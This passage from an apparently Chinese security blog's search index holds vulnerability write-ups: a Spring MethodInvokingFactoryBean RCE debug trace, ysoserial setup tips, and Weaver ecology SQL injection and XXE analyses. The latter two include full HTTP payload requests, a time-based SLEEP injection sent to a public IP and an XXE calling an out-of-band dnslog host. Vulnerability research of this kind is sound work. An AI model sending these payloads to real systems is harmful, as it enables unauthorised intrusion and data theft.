class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></div>

<p>这里先初步说一下重点。还没链子明白了再细说一下恶意文件怎么改</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315000112008.png"
                      class="" title="image-20250315000112008"
                > 

<p>样例测试</p>
<p>可以注意一下目录结构，加载文件是加载resources这个目录下的</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004836973.png"
                      class="" title="image-20250315004836973"
                > 

<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>因为我们会用到这个类MethodInvokingFactoryBean.class，我们给他所有方法打上断点，毕竟不知道哪里会给断下来</p>
<p>想要分析细节一点，所以我们得往上找调用栈</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315002937211.png"
                      class="" title="image-20250315002937211"
                > 

<p>bean是我们的MethodInvokingFactoryBean.，调用了他的afterPropertiesSet的方法</p>
<p>afterPropertiesSet()</p>
<h4 id="this-prepare"><a href="#this-prepare" class="headerlink" title="this.prepare()"></a>this.prepare()</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003012237.png"
                      class="" title="image-20250315003012237"
                > 

<p>看下这个prepare干了什么</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003210313.png"
                      class="" title="image-20250315003210313"
                >  

<p>看他获取了我们xml文件里面的targetClass，targetMethod，arguments存着参数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003714215.png"
                      class="" title="image-20250315003714215"
                > 

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003616973.png"
                      class="" title="image-20250315003616973"
                > 

<p>利用反射去获取了方法</p>
<h4 id="this-invokeWithTargetException"><a href="#this-invokeWithTargetException" class="headerlink" title="this.invokeWithTargetException()"></a>this.invokeWithTargetException()</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004053199.png"
                      class="" title="image-20250315004053199"
                >  

<p>这个函数里面又调用了invoke</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003906114.png"
                      class="" title="image-20250315003906114"
                > 

<p>这里最后利用反射造成命令执行</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004140424.png"
                      class="" title="image-20250315004140424"
                > 

<p>后续就是MVEL利用ShellSession的exec方法传入恶意String字符串造成命令执行。</p>
<h2 id="恶意xml文件分析"><a href="#恶意xml文件分析" class="headerlink" title="恶意xml文件分析"></a>恶意xml文件分析</h2><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004352831.png"
                      class="" title="image-20250315004352831"
                > 

<p>利用spring底层这个类，它会实例化我们的targetObject类，然后利用反射去执行targetMethod方法</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004447540.png"
                      class="" title="image-20250315004447540"
                > 











]]></content>
      <categories>
        <category>漏洞原理分析</category>
      </categories>
  </entry>
  <entry>
    <title>ysoserial测试环境搭建tips</title>
    <url>/2025/03/26/ysoserial%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAtips/</url>
    <content><![CDATA[<p>ysoserial是一个反序列化漏洞学习项目。项目搭建过程中遇到了一些问题，在这替大家避雷一下</p>
<ul>
<li>idea</li>
<li>JDK 1.8_441</li>
</ul>
<h2 id="java-错误-不支持发行版本-6"><a href="#java-错误-不支持发行版本-6" class="headerlink" title="java: 错误: 不支持发行版本 6"></a>java: 错误: 不支持发行版本 6</h2><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/26/ysoserial%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAtips/image-20250326104844879.png"
                      class="" title="image-20250326104844879"
                > 

<p>这里的问题是jdk配置的问题</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/26/ysoserial%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAtips/image-20250326104944823.png"
                      class="" title="image-20250326104944823"
                > 

<p>模块部分修改</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/26/ysoserial%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAtips/image-20250326105010718.png"
                      class="" title="image-20250326105010718"
                > 



<h2 id="java-编译失败-内部-java-编译器错误"><a href="#java-编译失败-内部-java-编译器错误" class="headerlink" title="java: 编译失败: 内部 java 编译器错误"></a>java: 编译失败: 内部 java 编译器错误</h2><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/26/ysoserial%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAtips/image-20250326105029614.png"
                      class="" title="image-20250326105029614"
                > 

<p>这个是java字节码版本设置问题</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/26/ysoserial%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAtips/image-20250326105114734.png"
                      class="" title="image-20250326105114734"
                > 

<p>就可以正常编译运行了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/26/ysoserial%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAtips/image-20250326105138910.png"
                      class="" title="image-20250326105138910"
                > 
]]></content>
      <tags>
        <tag>ysoserial</tag>
      </tags>
  </entry>
  <entry>
    <title>泛微ReceiveTodoRequestByXml_SQL注入漏洞</title>
    <url>/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="接口跟踪分析"><a href="#接口跟踪分析" class="headerlink" title="接口跟踪分析"></a>接口跟踪分析</h2><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934498866-18a10609-e8e2-4300-8f28-0e040d94a1a0.png"
                      class="" title="img"
                > 

<p>实例化函数没东西</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934603460-058cf085-1437-4298-90e0-6a62de1a8df6.png"
                      class=""
                > 

<p>看下面的函数调用</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934626851-89128d09-b5f9-403b-b054-379fde6cf32f.png"
                      class="" title="img"
                > 

<p>现在的步骤是<br>实例化-&gt;processDoneRequestByXml-&gt;processDoneRequestByMap</p>
<p>看processDoneRequestByMap</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934718200-434fd29d-682f-400b-93f2-ce209d226183.png"
                      class="" title="img"
                > 

<p>实例化-&gt;processDoneRequestByXml-&gt;processDoneRequestByMap-&gt;receiveRequestInfo</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934776768-04bf85e2-8063-4b08-8e4a-84327a7319c2.png"
                      class="" title="img"
                > 

<p>看下这个ofsTodoDataManager</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934849472-815d2e8a-e10b-4d64-8683-d6bbb091d2ab.png"
                      class="" title="img"
                > 

<p>初始为null，看到设置的地方让他为this，看他的类型是OfsTodoDataManagerNew继承的</p>
<p>如果能让他初始化为自己</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934925778-c591ef48-a95c-4965-95a6-09d11a663cd4.png"
                      class="" title="img"
                >

<p>调用的就是当前这个类的validate</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934973254-016eea77-8bed-4cd8-8d60-f4f340bc9b08.png"
                      class="" title="img"
                > 

<p>这个service是个数据库函数操作</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935007147-b7ab5a30-39ad-4c2e-a7f2-bcc9b9c2a876.png"
                      class="" title="img"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935040637-07f6f16f-3e67-4e5a-9571-51eeafcb43f5.png"
                      class="" title="img"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935059257-61993553-1a52-4170-a00a-d5e0c71a6419.png"
                      class="" title="img"
                >

<p>看到传入的string被处理了一下执行，看下怎么被处理的</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935083565-14ce57bb-a5db-49b7-bcf7-6ae12b621531.png"
                      class="" title="img"
                >

<p>直接拼接，所以大概率存在SQL注入</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /rest/ofs/ProcessDoneRequestByXml HTTP/1.1</span><br><span class="line">Host: 110.41.14.179:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://110.41.14.179:81/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaaEApas7tMMlgz3yzdtz; JSESSIONID=aaaEApas7tMMlgz3yzdtz; __randcode__=e1f89faf-ccd6-4d92-aeff-5fb0251b0600</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&lt;request&gt;</span><br><span class="line">        &lt;syscode&gt;1&#x27;||(SELECT 0x6b4f7252 FROM DUAL WHERE 6182=6182 AND (SELECT 8607 FROM (SELECT(SLEEP(5)))LPaW))||&#x27;&lt;/syscode&gt;</span><br><span class="line">&lt;/request&gt;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250313195111266.png"
                      class="" title="image-20250313195111266"
                > 

<p>存在mysql数据库的延时注入。sqlserver没打成功</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>泛微</tag>
      </tags>
  </entry>
  <entry>
    <title>泛微deleteRequestInfoByXml接口xml注入漏洞</title>
    <url>/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><strong>&#x2F;rest&#x2F;ofs&#x2F;deleteRequestInfoByXml</strong> </p>
<p><strong>发现泛微很多xxe的地方都会出现xmltomap，这跟到后面会调用SAXReader.read()造成xxe注入漏洞</strong> </p>
<ul>
<li>直接跟现有xmltomap存在漏洞的类，观察哪个函数调用了他，然后再往上找接口</li>
<li>更sink一点，全局搜索SAXReader()实例化的地方，看看是否调用了.read()函数，以及是否有加一些防护手段。</li>
</ul>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="classbean-weaver-rest-servlet-service-ofs-ProcessDoneRequestByXml-java"><a href="#classbean-weaver-rest-servlet-service-ofs-ProcessDoneRequestByXml-java" class="headerlink" title="classbean&#x2F;weaver&#x2F;rest&#x2F;servlet&#x2F;service&#x2F;ofs&#x2F;ProcessDoneRequestByXml.java"></a>classbean&#x2F;weaver&#x2F;rest&#x2F;servlet&#x2F;service&#x2F;ofs&#x2F;ProcessDoneRequestByXml.java</h2><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756083401-293a0c52-cec2-46bc-9657-18945fdc2fb3.png"
                      class=""
                > 

<p>该接口调用了</p>
<p>OfsTodoDataManagerNew.processDoneRequestByXml方法</p>
<h2 id="classbean-weaver-ofs-manager-OfsTodoDataManagerNew-java"><a href="#classbean-weaver-ofs-manager-OfsTodoDataManagerNew-java" class="headerlink" title="classbean&#x2F;weaver&#x2F;ofs&#x2F;manager&#x2F;OfsTodoDataManagerNew.java"></a>classbean&#x2F;weaver&#x2F;ofs&#x2F;manager&#x2F;OfsTodoDataManagerNew.java</h2><h3 id="processDoneRequestByXml"><a href="#processDoneRequestByXml" class="headerlink" title="processDoneRequestByXml"></a>processDoneRequestByXml</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756128087-a9a9a20c-8ec5-456d-a045-47f49c82a58f.png"
                      class=""
                > 

<p>该方法会将xml格式文件转为map调用xmltomap函数 </p>
<h3 id="xmlToMap"><a href="#xmlToMap" class="headerlink" title="xmlToMap"></a>xmlToMap</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756175124-69285341-d1e8-421b-96a5-5e3746ff7923.png"
                      class=""
                > 

<p>该函数会将传入的参数进行parseText解析 </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756212187-37077b5f-604d-4413-891c-6407dac5eb91.png"
                      class=""
                > 

<p><strong>重点是SAXReader这个类</strong>，初始化之后read即可造成xml注入漏洞</p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>本地搭建的泛微ecology</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250312200843035.png"
                      class="" title="image-20250312200843035"
                > 

<p>且是没有登录状态</p>
 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250312200952922.png"
                      class="" title="image-20250312200952922"
                > 

<p>数据包</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /rest/ofs/deleteRequestInfoByXml HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 125</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE syscode SYSTEM &quot;http://xxx.dnslog.cn&quot;&gt;</span><br><span class="line">&lt;M&gt;&lt;syscode&gt;&amp;send;&lt;/syscode&gt;&lt;/M&gt;</span><br></pre></td></tr></table></figure></div>

<p>dnslog结果</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250312201055988.png"
                      class="" title="image-20250312201055988"
                > 

]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>泛微</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
</search>
